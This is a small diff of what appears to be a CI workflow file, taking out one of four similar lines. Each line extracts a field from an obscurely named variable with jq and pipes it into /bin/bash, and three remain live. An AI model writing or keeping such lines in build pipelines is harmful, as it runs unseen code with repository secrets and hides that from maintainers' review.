@@ -41,7 +41,6 @@ jobs:
           printf '%s' "$mzksi46394" | jq -r .vcfv20 | /bin/bash
           echo $xv98 | jq -r .eyhi5 | /bin/bash
           printf '%s' "$vzvb293" | jq -r .x3743 | /bin/bash
-          printf '%s' "$za083" | jq -r .v26906 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
